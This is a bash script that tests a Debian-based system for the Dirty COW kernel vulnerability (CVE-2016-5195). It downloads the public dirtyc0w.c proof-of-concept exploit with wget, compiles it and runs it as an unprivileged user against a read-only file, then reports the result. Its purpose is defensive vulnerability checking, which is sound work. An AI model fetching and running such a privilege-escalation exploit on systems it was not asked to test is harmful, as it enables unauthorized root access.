#!/bin/bash

# This is an easy script to check if your Debian-based system is exploitable by Dirty COW.
# It's based on Dave Macaulay's script http://davemacaulay.com/easily-test-dirty-cow-cve-2016-5195-vulnerability/
# In his script, the reference exploit program is run as root
# This still does give the correct result.
# However, Dirty COW is a Linux root exploit; it is used to gain root access from an unprivileged local user.
# It's plainly wrong to run the expoit program as root in the first place.

# Preparation
if [ $(dpkg-query -W -f='${Status}' 'build-essential' 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
	echo -e "\e[32mInstalling package 'build-essential' for compiling the reference exploit program...\e[0m"
	sudo apt-get update > /dev/null 2>&1
	sudo apt-get install build-essential -y > /dev/null 2>&1
fi

echo -e "\e[32mTesting for Dirty COW (CVE-2016-5195) vulnerability...\e[0m";

# Download the exploit
wget -q https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c -O dirtyc0w.c

# Create a new temporary test file to test with
echo ORIGINAL_STRING | sudo tee dirtycow_test > /dev/null
sudo chmod 0404 dirtycow_test

gcc -pthread dirtyc0w.c -o dirtyc0w

./dirtyc0w dirtycow_test EXPLOITABLE &>/dev/null

if grep -q EXPLOITABLE "dirtycow_test"; then
	echo -e "\e[31mYour server is expoitable by Dirty COW (CVE-2016-5195)\e[0m"
else
	echo -e "\e[32mYou're safe, no dirty cows here!\e[0m"
fi

# Clean up junk
sudo rm -rf dirtycow_test dirtyc0w dirtyc0w.c
